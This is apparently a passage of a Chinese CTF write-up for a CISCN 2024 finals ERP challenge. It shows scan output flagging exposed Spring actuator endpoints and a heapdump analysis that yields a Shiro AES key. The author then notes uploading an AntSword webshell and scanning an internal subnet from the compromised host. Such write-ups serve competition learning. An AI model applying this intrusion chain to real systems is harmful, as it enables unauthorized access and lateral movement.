<h2 id="ERP"><a href="#ERP" class="headerlink" title="ERP"></a>ERP</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://8.130.44.201:8080  code:302 len:0      title:None 跳转url: http://8.130.44.201:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>65B247F806C408534985A1D9591BE5BE
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://8.130.44.201:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>65B247F806C408534985A1D9591BE5BE code:200 len:1383   title:Master ERP login Form
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://8.130.44.201:8080 poc-yaml-spring-actuator-heapdump-file
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://8.130.44.201:8080 poc-yaml-springboot-env-unauth spring2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>存在敏感信息泄露，访问<code>/actuator/env</code>可以读到配置信息</p>
<p><code>/actuator/heapdump</code>可以导出堆内存信息</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">java</span> <span class="token parameter variable">-jar</span> JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
Loading heap dump heapdump from cache failed.
java.io.IOException: HPROF <span class="token function">time</span> mismatch. Cached <span class="token number">1698502789924</span> from heap dump <span class="token number">1721521747178</span>
        at org.graalvm.visualvm.lib.jfluid.heap.HprofHeap.<span class="token operator">&lt;</span>init<span class="token operator">></span><span class="token punctuation">(</span>HprofHeap.java:385<span class="token punctuation">)</span>
        at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.loadHeap<span class="token punctuation">(</span>HeapFactory.java:96<span class="token punctuation">)</span>
        at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.createHeap<span class="token punctuation">(</span>HeapFactory.java:79<span class="token punctuation">)</span>
        at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.createHeap<span class="token punctuation">(</span>HeapFactory.java:55<span class="token punctuation">)</span>
        at org.graalvm.visualvm.lib.jfluid.heap.GraalvmHeapHolder.<span class="token operator">&lt;</span>init<span class="token operator">></span><span class="token punctuation">(</span>GraalvmHeapHolder.java:18<span class="token punctuation">)</span>
        at cn.wanghw.Main.call<span class="token punctuation">(</span>Main.java:66<span class="token punctuation">)</span>
        at cn.wanghw.Main.main<span class="token punctuation">(</span>Main.java:29<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
SpringDataSourceProperties
-------------
not found<span class="token operator">!</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
WeblogicDataSourceConnectionPoolConfig
-------------
not found<span class="token operator">!</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
MongoClient
-------------
not found<span class="token operator">!</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
AliDruidDataSourceWrapper
-------------
not found<span class="token operator">!</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
HikariDataSource
-------------
not found<span class="token operator">!</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
RedisStandaloneConfiguration
-------------
not found<span class="token operator">!</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
JedisClient
-------------
not found<span class="token operator">!</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
CookieRememberMeManager<span class="token punctuation">(</span>ShiroKey<span class="token punctuation">)</span>
-------------
algMode <span class="token operator">=</span> GCM, key <span class="token operator">=</span> 0f+dthGML0M572/nBElv8g<span class="token operator">==</span>, algName <span class="token operator">=</span> AES

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
OriginTrackedMapPropertySource
-------------
management.endpoints.web.exposure.include <span class="token operator">=</span> *
spring.thymeleaf.encoding <span class="token operator">=</span> UTF-8
management.endpoint.health.show-details <span class="token operator">=</span> always
spring.thymeleaf.cache <span class="token operator">=</span> <span class="token boolean">true</span>
spring.thymeleaf.content-type <span class="token operator">=</span> text/html
server.port <span class="token operator">=</span> <span class="token number">8080</span>
spring.thymeleaf.check-template <span class="token operator">=</span> <span class="token boolean">true</span>
management.endpoints.jmx.exposure.include <span class="token operator">=</span> *

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
MutablePropertySources
-------------
awt.toolkit <span class="token operator">=</span> sun.awt.X11.XToolkit
sun.boot.class.path <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes
java.protocol.handler.pkgs <span class="token operator">=</span> org.springframework.boot.loader
sun.management.compiler <span class="token operator">=</span> HotSpot <span class="token number">64</span>-Bit Tiered Compilers
sun.cpu.isalist <span class="token operator">=</span>
sun.jnu.encoding <span class="token operator">=</span> UTF-8
java.runtime.version <span class="token operator">=</span> <span class="token number">1.8</span>.0_412-8u412-ga-1~20.04.1-b08
java.class.path <span class="token operator">=</span> /opt/erp/ERPProject-0.0.1-SNAPSHOT.jar
path.separator <span class="token operator">=</span> <span class="token builtin class-name">:</span>
java.vm.vendor <span class="token operator">=</span> Private Build
os.version <span class="token operator">=</span> <span class="token number">5.4</span>.0-187-generic
java.endorsed.dirs <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed
java.runtime.name <span class="token operator">=</span> OpenJDK Runtime Environment
file.encoding <span class="token operator">=</span> UTF-8
catalina.useNaming <span class="token operator">=</span> <span class="token boolean">false</span>
spring.beaninfo.ignore <span class="token operator">=</span> <span class="token boolean">true</span>
java.vm.specification.version <span class="token operator">=</span> <span class="token number">1.8</span>
os.name <span class="token operator">=</span> Linux
java.vm.name <span class="token operator">=</span> OpenJDK <span class="token number">64</span>-Bit Server VM
local.server.port <span class="token operator">=</span> null
user.country <span class="token operator">=</span> US
java.vendor.url.bug <span class="token operator">=</span> http://bugreport.sun.com/bugreport/
sun.java.command <span class="token operator">=</span> /opt/erp/ERPProject-0.0.1-SNAPSHOT.jar
java.io.tmpdir <span class="token operator">=</span> /tmp
catalina.home <span class="token operator">=</span> /tmp/tomcat.8080.4070673021461777528
java.version <span class="token operator">=</span> <span class="token number">1.8</span>.0_412
user.home <span class="token operator">=</span> /root
user.language <span class="token operator">=</span> en
PID <span class="token operator">=</span> <span class="token number">589</span>
java.awt.printerjob <span class="token operator">=</span> sun.print.PSPrinterJob
CONSOLE_LOG_CHARSET <span class="token operator">=</span> UTF-8
file.separator <span class="token operator">=</span> /
catalina.base <span class="token operator">=</span> /tmp/tomcat.8080.4070673021461777528
java.vm.info <span class="token operator">=</span> mixed mode
java.specification.name <span class="token operator">=</span> Java Platform API Specification
java.vm.specification.vendor <span class="token operator">=</span> Oracle Corporation
FILE_LOG_CHARSET <span class="token operator">=</span> UTF-8
java.awt.graphicsenv <span class="token operator">=</span> sun.awt.X11GraphicsEnvironment
java.awt.headless <span class="token operator">=</span> <span class="token boolean">true</span>
sun.io.unicode.encoding <span class="token operator">=</span> UnicodeLittle
java.ext.dirs <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
MapPropertySources
-------------
local.server.port <span class="token operator">=</span> null

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
ConsulPropertySources
-------------
not found<span class="token operator">!</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
JavaProperties
-------------
java.util.logging.FileHandler.pattern <span class="token operator">=</span> %h/java%u.log
awt.toolkit <span class="token operator">=</span> sun.awt.X11.XToolkit
sun.cpu.isalist <span class="token operator">=</span>
sun.jnu.encoding <span class="token operator">=</span> UTF-8
java.class.path <span class="token operator">=</span> /opt/erp/ERPProject-0.0.1-SNAPSHOT.jar
jdk.security.legacyAlgorithms <span class="token operator">=</span> SHA1, RSA keySize <span class="token operator">&lt;</span> <span class="token number">2048</span>, DSA keySize <span class="token operator">&lt;</span> <span class="token number">2048</span>
java.vm.vendor <span class="token operator">=</span> Private Build
jdk.disabled.namedCurves <span class="token operator">=</span> secp112r1, secp112r2, secp128r1, secp128r2, secp160k1, secp160r1, secp160r2, secp192k1, secp192r1, secp224k1, secp224r1, secp256k1, sect113r1, sect113r2, sect131r1, sect131r2, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1, X9.62 c2tnb191v1, X9.62 c2tnb191v2, X9.62 c2tnb191v3, X9.62 c2tnb239v1, X9.62 c2tnb239v2, X9.62 c2tnb239v3, X9.62 c2tnb359v1, X9.62 c2tnb431r1, X9.62 prime192v2, X9.62 prime192v3, X9.62 prime239v1, X9.62 prime239v2, X9.62 prime239v3, brainpoolP256r1, brainpoolP320r1, brainpoolP384r1, brainpoolP512r1
crypto.policy <span class="token operator">=</span> unlimited
jceks.key.serialFilter <span class="token operator">=</span> java.lang.Enum<span class="token punctuation">;</span>java.security.KeyRep<span class="token punctuation">;</span>java.security.KeyRep<span class="token variable">$Type</span><span class="token punctuation">;</span>javax.crypto.spec.SecretKeySpec<span class="token punctuation">;</span><span class="token operator">!</span>*
sun.arch.data.model <span class="token operator">=</span> <span class="token number">64</span>
login.configuration.provider <span class="token operator">=</span> sun.security.provider.ConfigFile
catalina.useNaming <span class="token operator">=</span> <span class="token boolean">false</span>
user.timezone <span class="token operator">=</span>
security.overridePropertiesFile <span class="token operator">=</span> <span class="token boolean">true</span>
java.vm.specification.version <span class="token operator">=</span> <span class="token number">1.8</span>
os.name <span class="token operator">=</span> Linux
user.country <span class="token operator">=</span> US
security.provider.7 <span class="token operator">=</span> com.sun.security.sasl.Provider
sun.boot.library.path <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64
sun.java.command <span class="token operator">=</span> /opt/erp/ERPProject-0.0.1-SNAPSHOT.jar
security.provider.9 <span class="token operator">=</span> sun.security.smartcardio.SunPCSC
jdk.security.caDistrustPolicies <span class="token operator">=</span> SYMANTEC_TLS
sun.cpu.endian <span class="token operator">=</span> little
user.home <span class="token operator">=</span> /root
user.language <span class="token operator">=</span> en
java.specification.vendor <span class="token operator">=</span> Oracle Corporation
en <span class="token operator">=</span> UTF-8
security.provider.1 <span class="token operator">=</span> sun.security.provider.Sun
security.provider.2 <span class="token operator">=</span> sun.security.rsa.SunRsaSign
security.provider.3 <span class="token operator">=</span> sun.security.ec.SunEC
networkaddress.cache.negative.ttl <span class="token operator">=</span> <span class="token number">10</span>
jdk.tls.alpnCharset <span class="token operator">=</span> ISO_8859_1
security.provider.4 <span class="token operator">=</span> com.sun.net.ssl.internal.ssl.Provider
security.provider.5 <span class="token operator">=</span> com.sun.crypto.provider.SunJCE
security.provider.6 <span class="token operator">=</span> sun.security.jgss.SunProvider
ssl.KeyManagerFactory.algorithm <span class="token operator">=</span> SunX509
file.separator <span class="token operator">=</span> /
java.specification.name <span class="token operator">=</span> Java Platform API Specification
java.vm.specification.vendor <span class="token operator">=</span> Oracle Corporation
FILE_LOG_CHARSET <span class="token operator">=</span> UTF-8
.level <span class="token operator">=</span> INFO
java.awt.graphicsenv <span class="token operator">=</span> sun.awt.X11GraphicsEnvironment
ja <span class="token operator">=</span> UTF-8
java.awt.headless <span class="token operator">=</span> <span class="token boolean">true</span>
com.xyz.foo.level <span class="token operator">=</span> SEVERE
package.definition <span class="token operator">=</span> sun.,com.sun.xml.internal.,com.sun.imageio.,com.sun.istack.internal.,com.sun.jmx.,com.sun.media.sound.,com.sun.naming.internal.,com.sun.proxy.,com.sun.corba.se.,com.sun.org.apache.bcel.internal.,com.sun.org.apache.regexp.internal.,com.sun.org.apache.xerces.internal.,com.sun.org.apache.xpath.internal.,com.sun.org.apache.xalan.internal.extensions.,com.sun.org.apache.xalan.internal.lib.,com.sun.org.apache.xalan.internal.res.,com.sun.org.apache.xalan.internal.templates.,com.sun.org.apache.xalan.internal.utils.,com.sun.org.apache.xalan.internal.xslt.,com.sun.org.apache.xalan.internal.xsltc.cmdline.,com.sun.org.apache.xalan.internal.xsltc.compiler.,com.sun.org.apache.xalan.internal.xsltc.trax.,com.sun.org.apache.xalan.internal.xsltc.util.,com.sun.org.apache.xml.internal.res.,com.sun.org.apache.xml.internal.resolver.helpers.,com.sun.org.apache.xml.internal.resolver.readers.,com.sun.org.apache.xml.internal.security.,com.sun.org.apache.xml.internal.serializer.utils.,com.sun.org.apache.xml.internal.utils.,com.sun.org.glassfish.,com.oracle.xmlns.internal.,com.oracle.webservices.internal.,oracle.jrockit.jfr.,org.jcp.xml.dsig.internal.,jdk.internal.,jdk.nashorn.internal.,jdk.nashorn.tools.,jdk.xml.internal.,com.sun.activation.registries.,jdk.jfr.events.,jdk.jfr.internal.,jdk.management.jfr.internal.
sun.boot.class.path <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes
java.protocol.handler.pkgs <span class="token operator">=</span> org.springframework.boot.loader
sun.management.compiler <span class="token operator">=</span> HotSpot <span class="token number">64</span>-Bit Tiered Compilers
java.runtime.version <span class="token operator">=</span> <span class="token number">1.8</span>.0_412-8u412-ga-1~20.04.1-b08
policy.provider <span class="token operator">=</span> sun.security.provider.PolicyFile
user.name <span class="token operator">=</span> root
policy.url.1 <span class="token operator">=</span> file:<span class="token variable">$&#123;java.home&#125;</span>/lib/security/java.policy
path.separator <span class="token operator">=</span> <span class="token builtin class-name">:</span>
fr <span class="token operator">=</span> UTF-8
securerandom.source <span class="token operator">=</span> file:/dev/random
policy.url.2 <span class="token operator">=</span> file:<span class="token variable">$&#123;user.home&#125;</span>/.java.policy
jdk.tls.disabledAlgorithms <span class="token operator">=</span> SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize <span class="token operator">&lt;</span> <span class="token number">1024</span>, EC keySize <span class="token operator">&lt;</span> <span class="token number">224</span>, 3DES_EDE_CBC, anon, NULL, include jdk.disabled.namedCurves
os.version <span class="token operator">=</span> <span class="token number">5.4</span>.0-187-generic
java.endorsed.dirs <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed
policy.ignoreIdentityScope <span class="token operator">=</span> <span class="token boolean">false</span>
java.runtime.name <span class="token operator">=</span> OpenJDK Runtime Environment
keystore.type.compat <span class="token operator">=</span> <span class="token boolean">true</span>
file.encoding <span class="token operator">=</span> UTF-8
spring.beaninfo.ignore <span class="token operator">=</span> <span class="token boolean">true</span>
java.util.logging.ConsoleHandler.formatter <span class="token operator">=</span> java.util.logging.SimpleFormatter
java.vm.name <span class="token operator">=</span> OpenJDK <span class="token number">64</span>-Bit Server VM
jdk.sasl.disabledMechanisms <span class="token operator">=</span>
java.vendor.url.bug <span class="token operator">=</span> http://bugreport.sun.com/bugreport/
java.io.tmpdir <span class="token operator">=</span> /tmp
java.util.logging.FileHandler.formatter <span class="token operator">=</span> java.util.logging.XMLFormatter
java.util.logging.FileHandler.count <span class="token operator">=</span> <span class="token number">1</span>
catalina.home <span class="token operator">=</span> /tmp/tomcat.8080.4070673021461777528
sun.cds.enableSharedLookupCache <span class="token operator">=</span> <span class="token boolean">false</span>
java.version <span class="token operator">=</span> <span class="token number">1.8</span>.0_412
sun.security.krb5.maxReferrals <span class="token operator">=</span> <span class="token number">5</span>
jdk.tls.keyLimits <span class="token operator">=</span> AES/GCM/NoPadding KeyUpdate <span class="token number">2</span>^37
java.vm.specification.name <span class="token operator">=</span> Java Virtual Machine Specification
PID <span class="token operator">=</span> <span class="token number">589</span>
java.awt.printerjob <span class="token operator">=</span> sun.print.PSPrinterJob
CONSOLE_LOG_CHARSET <span class="token operator">=</span> UTF-8
jdk.xml.dsig.secureValidationPolicy <span class="token operator">=</span> disallowAlg http://www.w3.org/TR/1999/REC-xslt-19991116,disallowAlg http://www.w3.org/2001/04/xmldsig-more<span class="token comment">#rsa-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#hmac-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#md5,maxTransforms 5,maxReferences 30,disallowReferenceUriSchemes file http https,minKeySize RSA 1024,minKeySize DSA 1024,minKeySize EC 224,noDuplicateIds,noRetrievalMethodLoops</span>
catalina.base <span class="token operator">=</span> /tmp/tomcat.8080.4070673021461777528
java.library.path <span class="token operator">=</span> /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib
java.util.logging.FileHandler.limit <span class="token operator">=</span> <span class="token number">50000</span>
java.vendor <span class="token operator">=</span> Private Build
java.vm.info <span class="token operator">=</span> mixed mode
keystore.type <span class="token operator">=</span> jks
java.specification.maintenance.version <span class="token operator">=</span> <span class="token number">5</span>
handlers <span class="token operator">=</span> java.util.logging.ConsoleHandler
java.ext.dirs <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext
sun.io.unicode.encoding <span class="token operator">=</span> UnicodeLittle
policy.expandProperties <span class="token operator">=</span> <span class="token boolean">true</span>
securerandom.strongAlgorithms <span class="token operator">=</span> NativePRNGBlocking:SUN
krb5.kdc.bad.policy <span class="token operator">=</span> tryLast

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
ProcessEnvironment
-------------
not found<span class="token operator">!</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
OSS
-------------
not found<span class="token operator">!</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
UserPassSearcher
-------------
org.apache.shiro.web.filter.authc.FormAuthenticationFilter:
<span class="token punctuation">[</span>failureKeyAttribute <span class="token operator">=</span> shiroLoginFailure, loginUrl <span class="token operator">=</span> /login, successUrl <span class="token operator">=</span> /, usernameParam <span class="token operator">=</span> username, passwordParam <span class="token operator">=</span> password<span class="token punctuation">]</span>

org.apache.catalina.startup.Tomcat:
<span class="token punctuation">[</span>hostname <span class="token operator">=</span> localhost<span class="token punctuation">]</span>


<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以在里面找到shiro密钥</p>
<p><code>algMode = GCM, key = 0f+dthGML0M572/nBElv8g==, algName = AES</code></p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721084057165.png" alt="image-20240721084057165"></p>
<p>然后上蚁剑马即可，flag在根目录下</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721084318969.png" alt="image-20240721084318969"></p>
<p>接下来以这个为跳板机，传个fscan扫一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ./fscan <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.8.146/24
<span class="token number">192.168</span>.8.146:22 <span class="token function">open</span>
<span class="token number">192.168</span>.8.38:139 <span class="token function">open</span>
<span class="token number">192.168</span>.8.16:139 <span class="token function">open</span>
<span class="token number">192.168</span>.8.26:139 <span class="token function">open</span>
<span class="token number">192.168</span>.8.9:139 <span class="token function">open</span>
<span class="token number">192.168</span>.8.12:139 <span class="token function">open</span>
<span class="token number">192.168</span>.8.26:135 <span class="token function">open</span>
<span class="token number">192.168</span>.8.38:135 <span class="token function">open</span>
<span class="token number">192.168</span>.8.16:135 <span class="token function">open</span>
<span class="token number">192.168</span>.8.12:135 <span class="token function">open</span>
<span class="token number">192.168</span>.8.9:135 <span class="token function">open</span>
